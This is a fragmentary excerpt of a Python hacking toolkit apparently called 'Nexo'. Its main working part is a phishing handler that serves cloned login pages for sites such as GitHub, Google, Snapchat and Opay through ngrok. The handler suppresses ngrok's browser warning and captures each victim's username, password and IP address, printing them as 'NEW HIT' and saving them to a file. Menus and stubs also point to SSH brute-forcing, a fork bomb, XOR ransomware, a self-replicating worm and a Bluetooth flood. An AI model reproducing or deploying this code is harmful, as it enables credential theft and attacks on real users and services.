...
def handle_phish(site):
    ...
    if request.method == 'GET':
        try:
            content = render_template(f"{site}.html")
            response = make_response(content)
            response.headers['ngrok-skip-browser-warning'] = '777' 
            return response
        except Exception as e:
            return f"Error: Template {site}.html not found."

    # --- THIS PART MUST BE ON THE SAME INDENT LEVEL AS THE 'GET' ABOVE ---
    if request.method == 'POST':
        u, p = request.form.get('user'), request.form.get('pass')
        
        # --- [ SHOW ON TERMINAL - VERTICAL ] ---
        print(f"\n{R}{B}═" + "═"*45)
        print(f"  {G}[!] NEW HIT: {site.upper()}")
        print(f"  {Y}USER GMAIL: {W}{u}")
        print(f"  {Y}PASSWORD:   {W}{p}")
        print(f"  {Y}VICTIM IP:  {W}{victim_ip}")
        print(f"{R}{B}═" + "═"*45 + f"{W}\n")
        
        # --- [ SAVE TO FILE ] ---
        with open("nexo_hits.txt", "a") as f:
            f.write(f"\n[{time.strftime('%H:%M')}] {site.upper()}\nUSER: {u}\nPASS: {p}\nIP: {victim_ip}\n" + "-"*20 + "\n")
...
def start_phish():
    ...
    sites = {
        ...
        "5":"github", "6":"youtube", "7":"snapchat", "8":"twitter", "9":"Google", "10"
            :"Opay"
    }
    ...
    for _ in range(15):
        try:
            # CRITICAL FIX: Talking to Ngrok API Port 4040
    ...
    if url:
        ...
        print(f"{R}[-] API 4040 Error: Link Generation Failed.{W}")
        time.sleep(2)
...
def ssh_brute():
    ...
    time.sleep(2)
    print(f"{R}[-] Brute-force failed: Access Denied.{W}")
    input("\nEnter to return...")

def virus_lab():
    nexo_banner("DEADLY VIRUS LAB")
    print(f"  {R}1.{W} BLACKOUT (Fork Bomb)")
    print(f"  {R}2.{W} CRYPTO-LOCKER (XOR Ransom)")
    print(f"  {R}3.{W} THE WORM (Self-Replicator)")
...
def bluetooth_crash():
    ...
    print(f"{R}[!] Starting L2CAP Flood...{W}")
